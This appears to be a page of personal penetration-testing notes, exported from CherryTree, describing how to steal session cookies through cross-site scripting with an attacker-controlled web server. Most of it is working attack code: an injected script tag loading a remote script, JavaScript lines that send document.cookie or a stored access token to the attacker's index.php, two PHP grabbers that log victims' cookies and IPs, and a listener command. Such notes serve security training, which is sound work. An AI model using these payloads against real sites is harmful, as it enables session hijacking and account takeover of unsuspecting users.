<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. Steal Cookies (with an Attacker WebServer)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2. Steal Cookies (with an Attacker WebServer)</h1><br/><br />Inject a payload that through javascript will load an external file (script.js) on the attacker machine that in turn will load a php file (index.php) always hosted on the attacker machine<br />	<br /><br /><br />0. Once found the payload to use to request an external file<br />	payload: <code>&quot;&gt;&lt;script+src=http://10.10.15.91/script.js&gt;&lt;/script&gt;</code><br /><br />1. <strong>script.js</strong>: write a javasript payload in script.js to steal the cookies in the attacker listening machine<br />    Use one of the following payloads to send the cookies of the target victim to the controlled page(OUR_IP)<br />    PayloadAllTheThings: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss</a><br />    <div class="codebox"><pre>document.location=&#39;http://OUR_IP/index.php?c=&#39;+document.cookie</pre></div><br />     <a href=""><img src="images/2471-1.png" alt="images/2471-1.png" /></a><br />    <div class="codebox"><pre>document.location=&#39;http://OUR_IP/index.php?c=&#39;+localStorage.getItem(&#39;access_token&#39;)</pre></div><br />    <div class="codebox"><pre>new Image().src=&quot;http://OUR_IP/index.php?c=&quot;+document.cookie;</pre></div><br />    <div class="codebox"><pre>new Image().src=&quot;http://OUR_IP/index.php?c=&quot;+localStorage.getItem(&#39;access_token&#39;);</pre></div><br />    The content of script.js will let to the victim request for the <strong>index.php</strong> page(always on the attacker machine) + sending the cookies of the victim<br />    <span style="color:#ffa500;text-decoration:underline;">Note:</span> if we write the payload in a file we do not need to use &lt;script&gt;<br />2. <strong>index.php</strong>: Save the Data Grabber file<br />   ◇ Simple Cookie Grabber<br />       <div class="codebox"><pre>&lt;?php<br />    $cookie = $_GET[&#39;c&#39;];<br />    $fp = fopen(&#39;cookies.txt&#39;, &#39;a+&#39;);<br />    fwrite($fp, &#39;Cookie:&#39; .$cookie.&quot;\r\n&quot;);<br />    fclose($fp);<br />?&gt;</pre></div><br />   ◇ if there were many cookies, we may not know which cookie value belongs to which cookie header. <br />      So, we can use the following PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we&#39;ll get all of their cookies ordered in a file.<br />    <div class="codebox"><pre>&lt;?php<br />if (isset($_GET[&#39;c&#39;])) {<br />    $list = explode(&quot;;&quot;, $_GET[&#39;c&#39;]);<br />    foreach ($list as $key =&gt; $value) {<br />        $cookie = urldecode($value);<br />        $file = fopen(&quot;cookies.txt&quot;, &quot;a+&quot;);<br />        fputs($file, &quot;Victim IP: {$_SERVER[&#39;REMOTE_ADDR&#39;]} | Cookie: {$cookie}\n&quot;);<br />        fclose($file);<br />    }<br />}<br />?&gt;</pre></div><br />    <a href=""><img src="images/2471-2.png" alt="images/2471-2.png" /></a><br />3. Re-run the PHP server again<br />    <div class="codebox"><pre>sudo php -S 0.0.0.0:80</pre></div><br /><br /><br />4. Request for the script.js<br />    payload: <code>&quot;&gt;&lt;script+src=http://10.10.15.91/script.js&gt;&lt;/script&gt;</code><br />   ◇ &quot;&gt; → is been used to close the request before<br />   ◇&lt;script+src=http://OUR_IP/script.js&gt;&lt;/script&gt; →  to include an external file we need this format <a href="https://www.w3schools.com/tags/att_script_src.asp">https://www.w3schools.com/tags/att_script_src.asp</a><br />       <a href=""><img src="images/2471-3.png" alt="images/2471-3.png" /></a><br />7. In the PHP server listening we should have a request for script.js that in turn request index.php<br />    <a href=""><img src="images/2471-4.png" alt="images/2471-4.png" /></a><br />    <a href=""><img src="images/2471-5.png" alt="images/2471-5.png" /></a><br />9. Let&#39;s check the value of cookies.txt generated by index.php<br />   ◇ This would be the file generated by the simple cookie grabber of point 2<br />       <a href=""><img src="images/2471-6.png" alt="images/2471-6.png" /></a><br />   ◇ This is the file generated by the more complex cookie grabber. The Victim Ip is the one of the WebServer<br />       <a href=""><img src="images/2471-7.png" alt="images/2471-7.png" /></a><br />        <a href=""><img src="images/2471-8.png" alt="images/2471-8.png" /></a><br />7. Once we have the the cookie we can insert it int the Storage Cookies<br />    <a href=""><img src="images/2471-9.png" alt="images/2471-9.png" /></a></div>
</body>
</html>
